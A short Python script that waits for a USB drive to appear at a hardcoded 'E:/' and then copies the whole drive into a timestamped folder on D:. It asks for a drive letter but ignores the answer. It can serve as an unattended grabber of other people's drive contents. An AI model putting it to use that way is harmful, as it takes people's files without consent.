# -*- coding:utf-8 -*-
import os
import time
from datetime import datetime
import shutil

input("请输入U盘盘符地址，例如E:/\n")
# U盘的盘符
usb_path = "E:/"
# 要复制到的路径
save_path = "D:/haha"

while (True):
    if os.path.exists(usb_path):
        shutil.copytree(usb_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d_%H%M%S")))
        break
    else:
        time.sleep(10)
